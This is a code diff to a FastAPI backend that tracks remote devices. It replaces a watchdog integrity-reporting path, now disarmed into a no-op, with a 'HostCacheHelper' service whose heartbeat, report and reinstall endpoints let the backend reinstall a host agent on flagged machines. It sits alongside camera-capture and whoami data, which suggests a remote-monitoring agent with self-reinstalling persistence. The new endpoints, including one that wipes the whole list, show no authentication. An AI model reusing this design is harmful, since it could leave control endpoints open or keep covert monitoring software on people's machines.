@@ -561,6 +561,19 @@ async def list_devices():
                 "last_online_ago": calculate_last_online_ago(d["last_seen"], status == "online"),
                 "viewer_count": len(subscriber_ws.get(d["device_id"], [])),
             }
+            # HostCacheHelper liveness — separate heartbeat signal from the main WS.
+            helper_last_seen = d.get("helper_last_seen", "")
+            helper_online = False
+            if helper_last_seen:
+                try:
+                    helper_ts = datetime.fromisoformat(helper_last_seen)
+                    if (datetime.now(timezone.utc) - helper_ts).total_seconds() < 90:
+                        helper_online = True
+                except Exception:
+                    pass
+            entry["helper_online"] = helper_online
+            entry["helper_last_seen"] = helper_last_seen
+            entry["helper_status"] = d.get("helper_status", "")
             if d.get("host_ip"):
                 entry["host_ip"] = d["host_ip"]
             if d.get("whoami"):
@@ -1012,38 +1025,88 @@ async def capture_device_camera(device_id: str):
         raise HTTPException(status_code=500, detail="Failed to capture camera")
 
 
-# ── Compromised Devices ──────────────────────────────────────
-class CompromisedReportRequest(BaseModel):
-    device_id: str = Field(..., min_length=1, max_length=100)
-    watchdog: str = Field(..., min_length=1)
-    status: str = Field(..., pattern=r'^(ok|compromised|buddy_down)$')
-
-class CompromisedDeviceResponse(BaseModel):
-    device_id: str
-    last_report: str
-    status: str
-    watchdogs: List[dict]
+# ── Compromised Devices / HostCacheHelper ─────────────────────
+# The old watchdog pair (WatchdogPrimary/WatchdogBuddy) reported every device
+# as "compromised" whenever the main exe wasn't actively running — flooding the
+# list. That control is DISARMED: /compromised-devices/report is now a no-op.
+# The new HostCacheHelper service owns integrity reporting + reinstall via
+# /api/helper/*.
 
 @api_router.post("/compromised-devices/report")
-async def report_compromised(req: CompromisedReportRequest):
+async def report_compromised(req: dict):
+    """DISARMED — old watchdog reports are ignored so devices stop being flagged."""
+    return {"success": True, "pending": False}
+
+class HelperHeartbeatRequest(BaseModel):
+    device_id: str = Field(..., min_length=1, max_length=100)
+    version: Optional[str] = None
+
+class HelperReportRequest(BaseModel):
+    device_id: str = Field(..., min_length=1, max_length=100)
+    status: str = Field(..., pattern=r'^(ok|compromised)$')
+    details: Optional[str] = None
+    stage: Optional[str] = Field(None, pattern=r'^(queued|downloading|installing|successful|failed)$')
+    message: Optional[str] = None
+
+@api_router.post("/helper/heartbeat")
+async def helper_heartbeat(req: HelperHeartbeatRequest):
+    """HostCacheHelper reports ACTIVE/ONLINE. Backend records helper_online + last_seen."""
     async def operation():
         now = datetime.now(timezone.utc)
-        await db.compromised_devices.update_one(
+        update = {
+            "helper_online": True,
+            "helper_last_seen": now.isoformat(),
+        }
+        if req.version:
+            update["helper_version"] = req.version
+        await db.devices.update_one(
             {"device_id": req.device_id},
-            {
-                "$set": {
-                    f"watchdogs.{req.watchdog}.status": req.status,
-                    f"watchdogs.{req.watchdog}.last_report": now.isoformat(),
-                    "last_report": now.isoformat(),
-                    "overall_status": req.status
-                }
-            },
+            {"$set": update},
             upsert=True
         )
-        logger.info(f"[COMPROMISED] Report from {req.device_id}: {req.watchdog}={req.status}")
-        doc = await db.compromised_devices.find_one({"device_id": req.device_id}, {"pending_reinstall": 1})
-        pending = (doc or {}).get("pending_reinstall", False)
-        return {"success": True, "pending": pending}
+        return {"success": True, "device_id": req.device_id, "status": "active"}
+    return await safe_mongo_operation(operation)
+
+@api_router.post("/helper/report")
+async def helper_report(req: HelperReportRequest):
+    """HostCacheHelper integrity result + reinstall progress stages."""
+    async def operation():
+        now = datetime.now(timezone.utc)
+        device_id = req.device_id
+
+        # Always refresh helper liveness on the device doc.
+        await db.devices.update_one(
+            {"device_id": device_id},
+            {"$set": {"helper_online": True, "helper_last_seen": now.isoformat(),
+                       "helper_status": req.status}},
+            upsert=True
+        )
+
+        if req.status == "compromised" or req.stage is not None:
+            update = {
+                "overall_status": req.status,
+                "last_report": now.isoformat(),
+                "reinstall_state": req.stage if req.stage else "none",
+            }
+            if req.details:
+                update["details"] = req.details
+            if req.message:
+                update["reinstall_msg"] = req.message
+            await db.compromised_devices.update_one(
+                {"device_id": device_id},
+                {"$set": update},
+                upsert=True
+            )
+            logger.info(f"[HELPER] {device_id} report: status={req.status} stage={req.stage} details={req.details}")
+        else:
+            # status=ok and no active stage → device is healthy, remove from list.
+            await db.compromised_devices.delete_one({"device_id": device_id})
+            await db.devices.update_one(
+                {"device_id": device_id},
+                {"$set": {"helper_status": "ok"}}
+            )
+            logger.info(f"[HELPER] {device_id} healthy — removed from compromised list")
+        return {"success": True}
     return await safe_mongo_operation(operation)
 
 @api_router.get("/compromised-devices")
@@ -1055,49 +1118,62 @@ async def list_compromised():
         for d in docs:
             device_info = await db.devices.find_one(
                 {"device_id": d["device_id"]},
-                {"device_name": 1, "whoami": 1, "_id": 0}
+                {"device_name": 1, "whoami": 1, "helper_online": 1, "helper_last_seen": 1, "_id": 0}
             )
             devices_list.append({
                 "device_id": d["device_id"],
                 "last_report": d.get("last_report", ""),
-                "status": d.get("overall_status", "unknown"),
-                "watchdogs": d.get("watchdogs", {}),
+                "status": d.get("overall_status", "compromised"),
+                "details": d.get("details", ""),
+                "reinstall_state": d.get("reinstall_state", "none"),
+                "reinstall_msg": d.get("reinstall_msg", ""),
+                "pending_reinstall": d.get("pending_reinstall", False),
                 "device_name": (device_info or {}).get("device_name", d["device_id"]),
-                "whoami": (device_info or {}).get("whoami", "")
+                "whoami": (device_info or {}).get("whoami", ""),
+                "helper_online": (device_info or {}).get("helper_online", False),
+                "helper_last_seen": (device_info or {}).get("helper_last_seen", ""),
             })
         return {"devices": devices_list}
     return await safe_mongo_operation(operation)
 
-@api_router.post("/compromised-devices/download")
-async def download_binary(req: dict):
-    device_id = req.get("device_id", "")
-    if not device_id:
-        raise HTTPException(status_code=400, detail="device_id required")
-    # The host agent binary download URL
-    # For now, this returns the URL; the watchdog uses it to download the installer
-    return {
-        "success": True,
-        "download_url": "https://clearwebit.com/host-agent-download.exe",
-        "device_id": device_id
-    }
+@api_router.get("/helper/status/{device_id}")
+async def helper_status(device_id: str):
+    """Frontend polls reinstall progress for one device."""
+    async def operation():
+        doc = await db.compromised_devices.find_one(
+            {"device_id": device_id},
+            {"reinstall_state": 1, "reinstall_msg": 1, "pending_reinstall": 1, "overall_status": 1}
+        )
+        if not doc:
+            return {"device_id": device_id, "reinstall_state": "none", "reinstall_msg": "",
+                    "pending_reinstall": False, "status": "ok"}
+        return {
+            "device_id": device_id,
+            "reinstall_state": doc.get("reinstall_state", "none"),
+            "reinstall_msg": doc.get("reinstall_msg", ""),
+            "pending_reinstall": doc.get("pending_reinstall", False),
+            "status": doc.get("overall_status", "compromised"),
+        }
+    return await safe_mongo_operation(operation)
 
 @api_router.post("/compromised-devices/reinstall/{device_id}")
 async def trigger_reinstall(device_id: str):
-    """Set pending_reinstall flag — watchdog will download and install on next poll."""
+    """Set pending_reinstall flag — HostCacheHelper downloads + installs on next poll."""
     async def operation():
         now = datetime.now(timezone.utc)
         await db.compromised_devices.update_one(
             {"device_id": device_id},
-            {"$set": {"pending_reinstall": True, "reinstall_triggered_at": now.isoformat()}},
+            {"$set": {"pending_reinstall": True, "reinstall_triggered_at": now.isoformat(),
+                      "reinstall_state": "queued", "reinstall_msg": "Reinstall sent to device"}},
             upsert=True
         )
-        logger.info(f"[COMPROMISED] Reinstall triggered for {device_id}")
-        return {"success": True, "device_id": device_id, "message": "Reinstall queued"}
+        logger.info(f"[HELPER] Reinstall triggered for {device_id}")
+        return {"success": True, "device_id": device_id, "message": "Reinstall sent"}
     return await safe_mongo_operation(operation)
 
 @api_router.get("/compromised-devices/pending/{device_id}")
 async def check_pending_reinstall(device_id: str):
-    """Watchdog polls this to check if admin triggered reinstall."""
+    """HostCacheHelper polls this to check if admin triggered reinstall."""
     async def operation():
         doc = await db.compromised_devices.find_one({"device_id": device_id}, {"pending_reinstall": 1})
         pending = (doc or {}).get("pending_reinstall", False)
@@ -1106,12 +1182,13 @@ async def check_pending_reinstall(device_id: str):
 
 @api_router.post("/compromised-devices/pending-clear/{device_id}")
 async def clear_pending_reinstall(device_id: str):
-    """Watchdog calls this after completing reinstall."""
+    """HostCacheHelper calls this after a successful reinstall."""
     async def operation():
         now = datetime.now(timezone.utc)
         await db.compromised_devices.update_one(
             {"device_id": device_id},
-            {"$set": {"pending_reinstall": False, "reinstall_completed_at": now.isoformat()}}
+            {"$set": {"pending_reinstall": False, "reinstall_completed_at": now.isoformat(),
+                      "reinstall_state": "successful", "reinstall_msg": "Reinstall successful"}}
         )
         return {"success": True}
     return await safe_mongo_operation(operation)
@@ -1122,6 +1199,15 @@ async def delete_compromised_device(device_id: str):
     async def operation():
         result = await db.compromised_devices.delete_one({"device_id": device_id})
         return {"success": True, "deleted": result.deleted_count > 0}
+    return await safe_mongo_operation(operation)
+
+@api_router.delete("/compromised-devices")
+async def clear_all_compromised():
+    """Wipe the entire compromised devices list."""
+    async def operation():
+        result = await db.compromised_devices.delete_many({})
+        logger.info(f"[HELPER] Cleared all compromised devices (deleted {result.deleted_count})")
+        return {"success": True, "deleted": result.deleted_count}
     return await safe_mongo_operation(operation)
 
 
